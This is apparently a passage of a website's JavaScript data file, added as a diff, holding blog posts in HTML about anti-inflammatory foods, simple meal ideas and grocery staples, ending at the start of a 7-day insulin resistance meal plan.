+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Start with Color</h3>
+
+<p>Choose at least two colorful plant foods for each meal when possible. This might be spinach and blueberries at breakfast, broccoli and sweet potatoes at lunch, or avocado and leafy greens at dinner. Color naturally encourages variety, which makes your meals more interesting and nutrient-dense.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Add Healthy Fats</h3>
+
+<p>Healthy fats are central to many anti-inflammatory meals. Add avocado to a bowl, drizzle olive oil over vegetables, sprinkle walnuts over a salad, or include salmon as your protein. These ingredients help food taste satisfying and create a more balanced plate.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Use Spices for Flavor</h3>
+
+<p>Turmeric, ginger, garlic, cinnamon, herbs, and black pepper can bring warmth and depth to everyday recipes. Seasoning is one of the biggest reasons healthy meals feel enjoyable. A simple bowl of vegetables and protein can become memorable with the right blend of spices and a bright finishing touch like lemon.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Easy Everyday Anti-Inflammatory Meal Ideas</h2>
+
+<p>Once your kitchen has a few core staples, anti-inflammatory meals become much easier to assemble. The goal is to create repeatable combinations that you can adjust based on what you have available.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Breakfast Ideas</h3>
+
+<ul>
+  <li>Overnight oats with blueberries, chia seeds, walnuts, and cinnamon.</li>
+  <li>Green smoothie with spinach, avocado, berries, chia seeds, and green tea.</li>
+  <li>Greek yogurt bowl with berries, walnuts, and a drizzle of honey.</li>
+  <li>Avocado toast with spinach and a sprinkle of seeds.</li>
+</ul>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Lunch Ideas</h3>
+
+<ul>
+  <li>Salmon salad with spinach, avocado, olive oil, lemon, and walnuts.</li>
+  <li>Sweet potato bowl with broccoli, leafy greens, turmeric, and olive oil dressing.</li>
+  <li>Chia seed smoothie with berries and spinach.</li>
+  <li>Green tea iced drink with lemon and a light vegetable-packed wrap.</li>
+</ul>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Dinner Ideas</h3>
+
+<ul>
+  <li>Baked salmon with roasted broccoli and sweet potato.</li>
+  <li>Turmeric ginger vegetable soup with spinach.</li>
+  <li>Warm grain bowl with avocado, broccoli, olive oil, and walnuts.</li>
+  <li>Roasted vegetable tray with turmeric, ginger, and extra virgin olive oil.</li>
+</ul>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Shop for Anti-Inflammatory Kitchen Staples</h2>
+
+<p>A helpful grocery strategy is to shop in categories. Instead of trying to memorize a long list, think in terms of berries, greens, healthy fats, colorful vegetables, spices, nuts, seeds, and calming drinks. This makes grocery shopping more flexible and less stressful.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Fresh and Frozen Produce</h3>
+
+<p>Fresh produce is wonderful, but frozen options are just as useful for busy weeks. Frozen blueberries, spinach, broccoli, and salmon can make anti-inflammatory meals more accessible. They also help reduce waste because you can use only what you need.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Pantry Staples</h3>
+
+<p>Keep olive oil, walnuts, chia seeds, turmeric, ginger, cinnamon, green tea, and canned fish or legumes in your pantry. These ingredients can quickly upgrade meals when your fridge is low or your schedule is packed.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Prep Once, Use Often</h3>
+
+<p>Meal prep does not have to mean preparing a full week of identical meals. Try roasting sweet potatoes and broccoli, washing greens, cooking a protein, and making a simple olive oil dressing. With those pieces ready, you can build bowls, salads, wraps, and plates in minutes.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:30px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li><strong>Best quick snack:</strong> Berries with walnuts or yogurt.</li>
+    <li><strong>Best simple meal base:</strong> Leafy greens with olive oil and protein.</li>
+    <li><strong>Best pantry upgrades:</strong> Turmeric, ginger, chia seeds, and green tea.</li>
+    <li><strong>Best meal prep pair:</strong> Roasted broccoli and sweet potatoes.</li>
+    <li><strong>Best habit:</strong> Add one colorful plant food to every meal.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Common Mistakes to Avoid</h2>
+
+<p>One common mistake is trying to change everything at once. A wellness-focused food routine should feel supportive, not stressful. Start with one or two simple swaps, such as adding berries to breakfast, drinking green tea in the afternoon, or using olive oil as your main dressing base.</p>
+
+<p>Another mistake is thinking anti-inflammatory meals need to be bland. In reality, these foods can be full of flavor. Ginger, turmeric, lemon, garlic, herbs, olive oil, and toasted nuts can make simple ingredients taste restaurant-worthy.</p>
+
+<p>It is also easy to focus only on individual superfoods. While foods like turmeric, blueberries, and salmon are excellent staples, the bigger benefit comes from the overall pattern. A routine filled with whole foods, colorful produce, healthy fats, and satisfying meals is more useful than relying on one ingredient alone.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion: Make Anti-Inflammatory Eating Simple and Enjoyable</h2>
+
+<p>Anti-inflammatory eating is not about creating a perfect diet. It is about building a kitchen filled with foods that help you feel nourished, energized, and supported. Berries, salmon, spinach, turmeric, ginger, avocado, olive oil, walnuts, chia seeds, broccoli, sweet potatoes, and green tea are simple staples that can fit naturally into everyday life.</p>
+
+<p>The best place to start is with small, repeatable choices. Add spinach to a smoothie. Roast broccoli with olive oil. Keep berries in the freezer. Sprinkle chia seeds into breakfast. Brew a cup of green tea. Build a salmon bowl with sweet potato and avocado. Over time, these little habits can create a food routine that feels colorful, balanced, and genuinely enjoyable.</p>
+
+<p>When your meals are built around flavor, color, and consistency, anti-inflammatory eating becomes less of a trend and more of a practical lifestyle. Fill your grocery list with ingredients you actually like, keep your meals flexible, and let simple whole foods do the heavy lifting.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Anti-Inflammatory Foods</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Healthy Eating</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Wellness Foods</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Clean Eating</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Healthy Grocery List</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Meal Prep Ideas</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Whole Food Nutrition</span>
+</div>
+
+                `
+            },
+            {
+                id: 'Recip-Toddler',
+                title: 'Aliments anti-inflammatoires',
+                date: 'June 4, 2026',
+                image: './assets/Aliments anti-inflammatoires.png',
+                excerpt: 'Eating more anti-inflammatory foods is one of the simplest ways to make everyday meals work harder for your health. You do not need a complicated eating plan or a fridge full of expensive specialty products to get started. In most cases, the best anti-inflammatory foods are familiar staples like berries, spinach, broccoli, salmon, olive oil, walnuts, quinoa, sweet potatoes, and even a little dark chocolate.',
+                content : `
+                <p>Eating more anti-inflammatory foods is one of the simplest ways to make everyday meals work harder for your health. You do not need a complicated eating plan or a fridge full of expensive specialty products to get started. In most cases, the best anti-inflammatory foods are familiar staples like berries, spinach, broccoli, salmon, olive oil, walnuts, quinoa, sweet potatoes, and even a little dark chocolate. When you bring more of these foods into your weekly routine, you create meals that feel colorful, satisfying, and supportive of long-term wellness.</p>
+
+<p>The beauty of an anti-inflammatory approach is that it focuses on adding more of the good stuff. Instead of obsessing over restriction, you build plates around nutrient-dense whole foods, quality proteins, healthy fats, fiber-rich carbohydrates, and antioxidant-packed produce. This makes the lifestyle feel realistic and enjoyable, which is exactly what helps it stick.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Anti-inflammatory eating is built around whole foods, lean proteins, healthy fats, fruits, vegetables, legumes, and fiber-rich staples.</li>
+    <li>Foods like salmon, tuna, olive oil, walnuts, spinach, berries, and broccoli are easy additions to meals and snacks.</li>
+    <li>Simple pantry foods such as quinoa, chickpeas, lentils, and dark chocolate can fit into a balanced wellness routine.</li>
+    <li>The most effective approach is consistency, not perfection or an overly strict diet.</li>
+    <li>Colorful, minimally processed meals help support energy, satiety, and a more nourishing daily eating pattern.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why Anti-Inflammatory Foods Matter</h2>
+
+<p>Inflammation is a natural process in the body, but the everyday foods you choose can influence how balanced and supported your body feels over time. That is why so many people are drawn to anti-inflammatory foods. These ingredients are often rich in antioxidants, vitamins, minerals, healthy fats, and fiber. They help create a more balanced way of eating that supports overall health while still feeling delicious and practical.</p>
+
+<p>An anti-inflammatory food list usually includes lean proteins, fatty fish, yogurt, leafy greens, colorful vegetables, berries, citrus fruits, legumes, nuts, seeds, whole grains, and beneficial oils. These are not trendy ingredients that require a complete kitchen overhaul. Most of them are already easy to find in any grocery store, and many are likely sitting in your fridge or pantry right now.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> The goal of an anti-inflammatory diet is not to chase a perfect menu every day. The real value comes from consistently building meals around whole, colorful, nutrient-rich foods that you genuinely enjoy eating.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Best Anti-Inflammatory Foods to Eat More Often</h2>
+
+<p>If you want a practical starting point, focus on the foods that appear again and again in healthy eating guides. These are staples that are versatile, satisfying, and easy to fit into real life.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Greek Yogurt</h3>
+
+<p>Greek yogurt is a smart refrigerator staple because it is rich, creamy, and versatile. It works for breakfast, snacks, dips, and even sauce bases. Pairing it with berries or chopped walnuts makes for a simple, protein-rich snack that feels both nourishing and filling.</p>
+
+<p>It is also one of the easiest anti-inflammatory foods to work into your day because it needs very little preparation. A bowl of plain Greek yogurt topped with berries and a spoonful of nuts feels satisfying without being heavy.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Eggs</h3>
+
+<p>Eggs are one of the most convenient protein sources for quick meals. They are affordable, versatile, and easy to pair with vegetables like spinach, tomatoes, or zucchini. Scrambled eggs with sautéed greens or a veggie omelet are easy ways to turn breakfast into something more balanced and nutrient-dense.</p>
+
+<p>Because eggs cook quickly, they are especially useful on busy mornings or for fast dinners when you want something warm and satisfying without much effort.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Grilled Chicken, Tuna, and Wild Salmon</h3>
+
+<p>Quality protein is an important part of a well-rounded anti-inflammatory meal. Grilled chicken offers a lean option that pairs with almost any vegetable or grain. Tuna is a convenient pantry or fridge choice for salads, grain bowls, and wraps. Wild salmon stands out as one of the most popular anti-inflammatory foods thanks to its rich omega-3 fats and satisfying flavor.</p>
+
+<p>These proteins make it easier to create balanced meals because they pair beautifully with quinoa, roasted sweet potatoes, broccoli, spinach, olive oil, and avocado. A meal does not have to be fancy to feel nourishing. A piece of salmon with roasted vegetables and a drizzle of olive oil is already doing a lot right.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> When planning anti-inflammatory meals, choose one quality protein, one or two colorful vegetables, one healthy fat, and one fiber-rich carb. This simple formula makes meal building much easier.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Sweet Potatoes, Zucchini, Spinach, and Broccoli</h3>
+
+<p>Vegetables are the foundation of any anti-inflammatory grocery list, and these four deserve special attention because they are so easy to use. Sweet potatoes add natural sweetness and comfort. Zucchini is light, mild, and flexible enough for sautés, bowls, and sheet-pan dinners. Spinach is one of the easiest leafy greens to add to smoothies, eggs, pasta, and soups. Broccoli brings hearty texture and works beautifully roasted, steamed, or stir-fried.</p>
+
+<p>The more often you stock these vegetables, the easier healthy meal prep becomes. They are approachable, family-friendly, and work with both animal and plant-based proteins.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Easy Vegetable Pairings</h4>
+
+<ul>
+  <li>Roasted sweet potatoes with grilled chicken and spinach.</li>
+  <li>Zucchini sautéed with eggs and tomatoes for a quick breakfast.</li>
+  <li>Broccoli with salmon and quinoa for an easy dinner bowl.</li>
+  <li>Spinach added to smoothies, soups, pasta, or omelets.</li>
+</ul>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Berries, Apples, Oranges, and Tomatoes</h3>
+
+<p>Fruits and colorful produce are a major part of anti-inflammatory eating because they naturally bring antioxidants and freshness to the table. Berries are especially popular because they are sweet, convenient, and full of vibrant color. Apples and oranges make excellent grab-and-go options, while tomatoes add brightness to salads, sandwiches, egg dishes, and warm meals.</p>
+
+<p>One of the best things about these foods is how easy they are to keep in rotation. A bowl of berries with yogurt, an apple with walnuts, or sliced tomatoes with olive oil can all become small everyday habits that support a healthier pattern.</p>
+
+<div style="background:#f0fdf4;border:1px solid #bbf7d0;border-radius:12px;padding:18px 20px;margin:26px 0;color:#14532d;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#14532d;font-weight:700;padding-left:12px;border-left:4px solid #86efac;">Why This Matters</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Colorful produce helps diversify your meals and keeps healthy eating from feeling repetitive.</li>
+    <li>Fruit and vegetables often become the easiest way to add fiber and antioxidant-rich ingredients without much extra planning.</li>
+    <li>Keeping simple produce on hand makes better snack choices more likely.</li>
+  </ul>
+</div>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Olive Oil and Avocado</h3>
+
+<p>Healthy fats are essential for making meals satisfying, flavorful, and more balanced. Olive oil is one of the most useful pantry ingredients you can own. It works in dressings, marinades, roasting, and finishing drizzles. Avocado adds creamy texture and richness to everything from toast to salads to grain bowls.</p>
+
+<p>These ingredients are also helpful because they make simple meals feel more complete. A plain salad becomes much more satisfying with avocado and olive oil. A bowl of quinoa and vegetables instantly improves with the addition of healthy fat.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Many people focus only on cutting things out, but adding the right healthy fats can be just as valuable. Olive oil, avocado, walnuts, almonds, and salmon help create meals that are both nourishing and enjoyable.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Chickpeas, Lentils, and Quinoa</h3>
+
+<p>Fiber-rich staples deserve a permanent place in an anti-inflammatory kitchen. Chickpeas and lentils are incredibly useful because they are affordable, filling, and easy to toss into soups, salads, grain bowls, and side dishes. Quinoa is another standout because it cooks quickly and works as a base for both warm meals and cold salads.</p>
+
+<p>These foods are especially helpful if you want to create more plant-forward meals without making things complicated. A quinoa bowl with chickpeas, tomatoes, spinach, olive oil, and avocado is a perfect example of how simple ingredients can come together in a delicious way.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Walnuts, Almonds, and Dark Chocolate</h3>
+
+<p>Nuts are one of the easiest anti-inflammatory snacks to keep around. Walnuts and almonds add crunch, healthy fats, and staying power to fruit, yogurt, oatmeal, and salads. A small handful can turn a light snack into something much more satisfying.</p>
+
+<p>And yes, dark chocolate can absolutely fit into a balanced routine. Choosing dark chocolate in the 70 to 80 percent range offers a richer flavor and can feel like a more intentional treat. Paired with berries or a few nuts, it becomes a simple dessert that still fits the overall theme of nutrient-conscious eating.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Build an Anti-Inflammatory Plate</h2>
+
+<p>Creating anti-inflammatory meals becomes much easier when you stop thinking in terms of strict recipes and start thinking in building blocks. Most meals can be assembled from a few reliable categories.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Start with Protein</h3>
+
+<p>Choose grilled chicken, eggs, tuna, salmon, Greek yogurt, chickpeas, or lentils as your anchor. Protein helps keep meals satisfying and gives structure to breakfast, lunch, and dinner.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Add Colorful Produce</h3>
+
+<p>Layer in spinach, broccoli, tomatoes, zucchini, berries, apples, oranges, or sweet potatoes. Color helps create variety and encourages you to eat a wider range of whole foods.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Include a Healthy Fat</h3>
+
+<p>Finish the plate with olive oil, avocado, walnuts, or almonds. These ingredients add flavor and make meals feel more satisfying, which helps reduce the urge to snack mindlessly later.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Use a Smart Carb or Fiber-Rich Base</h3>
+
+<p>Sweet potatoes, quinoa, lentils, and chickpeas can all play this role. They make meals heartier and bring valuable texture and staying power.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Easy Anti-Inflammatory Meal Ideas for Real Life</h2>
+
+<p>One reason people stick with this eating style is that it translates well to normal, everyday meals. You do not need to reinvent your cooking style. You just need a few simple combinations that you can repeat often.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Breakfast Ideas</h3>
+
+<ul>
+  <li>Greek yogurt topped with berries, walnuts, and a few slices of apple.</li>
+  <li>Scrambled eggs with spinach and tomatoes.</li>
+  <li>Quinoa breakfast bowl with yogurt, berries, and almonds.</li>
+  <li>Avocado and egg toast with orange slices on the side.</li>
+</ul>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Lunch Ideas</h3>
+
+<ul>
+  <li>Tuna salad with spinach, tomatoes, olive oil, and chickpeas.</li>
+  <li>Quinoa bowl with grilled chicken, zucchini, broccoli, and avocado.</li>
+  <li>Lentil salad with tomatoes, olive oil, and chopped herbs.</li>
+  <li>Greek yogurt bowl with berries and nuts for a lighter lunch or snack plate.</li>
+</ul>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Dinner Ideas</h3>
+
+<ul>
+  <li>Wild salmon with roasted sweet potatoes and broccoli.</li>
+  <li>Grilled chicken served over quinoa with sautéed spinach and zucchini.</li>
+  <li>Lentil and tomato bowl finished with olive oil and avocado.</li>
+  <li>Egg-based vegetable scramble with tomatoes, spinach, and a side salad.</li>
+</ul>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Shop and Prep for Success</h2>
+
+<p>The easiest way to eat more anti-inflammatory foods is to make them visible, accessible, and convenient. A smart grocery routine can make a huge difference.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Buy a Mix of Fresh and Shelf-Stable Foods</h3>
+
+<p>Fresh spinach, broccoli, berries, tomatoes, and avocado are wonderful to have on hand, but pantry ingredients matter just as much. Stock quinoa, canned tuna, chickpeas, lentils, olive oil, nuts, and dark chocolate so you can still build a good meal on a busy day.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Prep a Few Basics Ahead of Time</h3>
+
+<p>Cook quinoa, roast sweet potatoes, wash spinach, and portion out nuts early in the week. These small steps make healthy choices feel much more convenient. When good ingredients are already prepped, it becomes easier to throw together a balanced meal in minutes.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Think in Combinations, Not Perfection</h3>
+
+<p>Try simple pairings like berries and yogurt, salmon and broccoli, eggs and spinach, or quinoa with chickpeas and tomatoes. These combinations remove decision fatigue and make healthy eating feel far more manageable.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> If you want a low-effort routine, keep at least one protein, one leafy green, one fruit, one healthy fat, and one fiber-rich carb ready to go at all times. That single habit makes anti-inflammatory meal planning dramatically easier.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Common Mistakes to Avoid</h2>
+
+<p>One common mistake is assuming anti-inflammatory eating has to be expensive or complicated. In reality, many of the best foods in this category are basic grocery staples. Eggs, lentils, chickpeas, spinach, apples, tomatoes, and oats or quinoa can all support a healthier pattern without stretching the budget.</p>
+
+<p>Another mistake is relying too heavily on one single food. Salmon is excellent, berries are great, and olive oil is a wonderful pantry item, but the real benefit comes from variety. A diverse mix of proteins, produce, healthy fats, and fiber-rich foods will always be more useful than focusing on one so-called superfood.</p>
+
+<p>It is also easy to forget that enjoyable food is sustainable food. If your healthy meals feel bland or repetitive, you will be less likely to continue. Use herbs, spices, texture, roasting, and fresh ingredients to keep meals interesting.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:30px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Quick Points</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Choose anti-inflammatory foods you can realistically eat every week.</li>
+    <li>Build meals with protein, produce, healthy fats, and fiber-rich carbs.</li>
+    <li>Keep pantry basics like olive oil, tuna, chickpeas, quinoa, and nuts on hand.</li>
+    <li>Use berries, tomatoes, spinach, and broccoli to add color and nutrients fast.</li>
+    <li>Let dark chocolate be a balanced treat, not a guilty one.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion: Make Anti-Inflammatory Eating a Simple Everyday Habit</h2>
+
+<p>Eating more anti-inflammatory foods does not require a dramatic lifestyle reset. It starts with small, practical choices like adding berries to breakfast, roasting broccoli for dinner, drizzling olive oil over vegetables, swapping in quinoa or lentils, and keeping salmon, tuna, eggs, or Greek yogurt in your regular rotation. These habits are simple, but together they create a much stronger nutritional foundation.</p>
+
+<p>The most effective anti-inflammatory diet is the one you can actually maintain. That means choosing foods you enjoy, building meals that satisfy you, and making grocery shopping feel easier instead of more stressful. With a kitchen stocked with colorful produce, quality proteins, healthy fats, legumes, whole grains, and a few smart snacks, you can create meals that support both wellness and enjoyment.</p>
+
+<p>Start with a handful of staples, repeat what works, and let consistency do the heavy lifting. Over time, those simple choices can shape a healthier, more balanced way of eating that feels natural rather than forced.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Anti-Inflammatory Foods</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Healthy Eating</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Anti-Inflammatory Diet</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Healthy Grocery List</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Whole Foods</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Meal Prep Ideas</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Wellness Nutrition</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Healthy Lifestyle</span>
+</div>
+
+                `
+            },
+            {
+                id: 'food-speed-Oil',
+                title: '7 Days Insulin Resistance Diet Plan',
+                date: 'April 1, 2026',
+                image: './assets/7 Days Insulin Resistance Diet Plan.png',
+                excerpt: 'Building a balanced meal plan can feel much easier when the ideas are simple, colorful, and realistic enough for everyday life. A 7-day insulin resistance meal plan is all about choosing meals that support steady energy, help reduce blood sugar spikes, and keep you satisfied with a thoughtful mix of protein, fiber, healthy fats, and slow-digesting carbohydrates.',
+                content : `
+                <p>Building a balanced meal plan can feel much easier when the ideas are simple, colorful, and realistic enough for everyday life. A 7-day insulin resistance meal plan is all about choosing meals that support steady energy, help reduce blood sugar spikes, and keep you satisfied with a thoughtful mix of protein, fiber, healthy fats, and slow-digesting carbohydrates. Instead of relying on restrictive rules, this style of eating focuses on building plates that feel nourishing, practical, and enjoyable.</p>
+
+<p>The meal ideas featured here highlight exactly that approach: veggie-packed breakfasts, lean proteins, fiber-rich sides, Greek yogurt bowls, salmon with whole grains, taco-inspired bowls, and protein pancakes with fresh berries. Each meal feels familiar, colorful, and approachable, which is one of the most important parts of creating a healthy eating routine you can actually stick with.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Insulin resistance meal planning works best when meals include protein, fiber, and healthy fats.</li>
+    <li>Balanced carbohydrates such as sweet potatoes, lentil pasta, quinoa, and berries can fit into a blood sugar-conscious routine.</li>
+    <li>Simple meal themes make weekly planning easier and reduce decision fatigue.</li>
+    <li>Colorful vegetables, lean proteins, and satisfying textures help meals feel enjoyable rather than restrictive.</li>
